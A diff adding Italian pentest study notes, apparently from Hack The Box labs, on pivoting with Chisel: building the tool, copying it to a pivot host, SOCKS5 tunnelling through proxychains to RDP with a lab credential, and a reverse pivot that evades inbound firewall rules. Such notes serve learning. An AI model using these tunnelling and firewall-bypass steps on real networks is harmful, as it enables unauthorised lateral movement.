@@ -410,3 +410,46 @@ su **preshared secret** ci va il secret prima generato dal server.
 
 ### Avviare una shell/windows
 `dnscat2> window -i 1`
+
+# SOCKS5 Tunneling with Chisel
+
+**Chisel** e' un tool per TCP/UDP tunneling scritto in Go. Usa HTTP per trasportare dati ed e' messo in sicurezza tramite SSH.
+Chisel puo' creare un tunnel client-server in un ambiente ristretto da firewall. 
+
+Praticamente setupperemo il server chisel nel pivot host.
+### Setting up chisel
+
+`j4k1dibe@htb[/htb]$ git clone https://github.com/jpillora/chisel.git`
+
+```
+j4k1dibe@htb[/htb]$ cd chisel
+go build
+```
+
+### Trasferire Chisel al pivot
+`j4k1dibe@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/`
+
+### RUnnare chisel nel pivot
+`ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5`
+
+
+### COnnettersi al pivot con chisel 
+`j4k1dibe@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks`
+
+
+### Usare chisel con Proxychains
+**Prima inserisco alla fine di /etc/proxychains.conf socks5  127.0.0.1 1080**
+
+`j4k1dibe@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
+
+## CHisel Reverse Pivot.
+
+In questo caso usando l'opzione **--reverse**, dovremmo startare il server da noi. E' utile per bypassare regole firewall.
+
+`j4k1dibe@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5` setuppo server sulla mia macchina
+
+
+`ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks` Sul pivot host.
+
+
+Alla fine il risultato raggiunto e' lo stesso ma cosi' bypassiamo regole frewall in-bound
